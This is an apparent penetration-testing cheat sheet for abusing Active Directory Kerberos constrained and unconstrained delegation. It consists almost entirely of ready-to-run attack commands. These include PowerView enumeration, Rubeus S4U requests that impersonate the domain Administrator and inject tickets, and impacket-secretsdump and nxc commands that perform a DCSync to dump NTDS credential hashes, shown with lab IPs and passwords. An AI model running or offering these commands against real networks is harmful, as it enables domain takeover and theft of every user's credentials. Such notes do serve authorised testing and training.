Constrained Delegation with Commands:

1.User authenticates to Service A (e.g., IIS Web Server).
2.Service A needs to access Service B (e.g., MSSQL Server) on behalf of the user.
3.Active Directory issues a delegated Kerberos ticket only for the allowed SPNs configured on Service A.

Steps:1 
Enumeration:
Tools:
  PowerView.ps1
    C:\Windows\Tasks>Get-DomainUser -TrustedToAuth
    C:\Windows\Tasks>Get-DomainComputer -TrustedToAuth

    Permissions:
      AllowedToDelegate
    ConstrainedDelegation
    CanRDP
    AdminTo

Steps:2 
Rubeus.exe s4u /user:svc_web /aes256:<AESKEY> /impersonateuser:Administrator /msdsspn:MSSQLSvc/SQL01.domain.local /ptt
.\Rubeus.exe asktgt /user:userName /domain:DomainName /ntlm:Hash /outfile:FileName.tgt
.\Rubeus.exe s4u /ticket:TGT_Ticket /msdsspn:"service/HOST" /impersonateuser:Administrator /ptt



Required: svc_web AES256 for this attack

Steps:3 
Now you access to the Server with user administrator privilege.


Link For this attack : https://www.hackingarticles.in/kerberos-constrained-delegation-exploitation/

UnConstrained Delegation with Commands:

Enumeration:

From Kali:
kali# impacket-findDelegation ignite.local/raj:Password@1 -dc-ip 192.168.1.11

From Local Machine:
C:\Windows\Tasks>Get-NetComputer -UnConstrained

DCSync Attack:
impacket-secretsdump 'ignite.local'/'aarti':'Password@1'@'192.168.1.48'
nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds
nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds --user administrator





  
